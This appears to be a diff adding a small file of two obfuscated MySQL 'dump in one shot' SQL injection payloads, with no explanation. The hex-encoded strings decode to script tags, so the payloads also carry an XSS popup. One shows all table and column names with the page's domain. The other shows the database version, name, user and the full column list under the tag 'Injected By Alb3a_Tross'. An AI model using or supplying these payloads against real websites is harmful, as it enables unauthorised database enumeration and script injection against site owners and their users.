@@ -1,0 +1,8 @@
+concat(0x3c7363726970743e70726f6d70742822,(select%20@a%20from(select%20(@a:=0x00),(select%20@a%20from%20information_schema.columns%20where%20@a%20in(@a:=concat(@a,table_name,%27=%3E%27,column_name,%27||%27))))a),0x222c646f63756d656e742e646f6d61696e293c2f7363726970743e)
+
+
+
+
+DIos:2 
+
+(concat/**c**/(0x3c7363726970743e616c6572742822496e6a656374656420427920416c6233615f54726f7373,0x5c6e,0x56657273696f6e203a3a20,version/**X**/(),0x5c6e,0x4461746162617365203a3a20,database/**x**/(),0x5c6e,0x55736572203a3a20,user/**x**/(),0x5c6e,(/**/SELECT+/**/GROUP_CONCAT(/*!12345table_name*/,0x3a3a3a3a,column_name+separator+0x5c6e)+from+/*!12345information_schema*/./*!12345columns*/+/*!50000where*/+/*!12345table_schema*/=/*!12345database/**X**/()*/),0x5c6e,0x22293c2f7363726970743e))
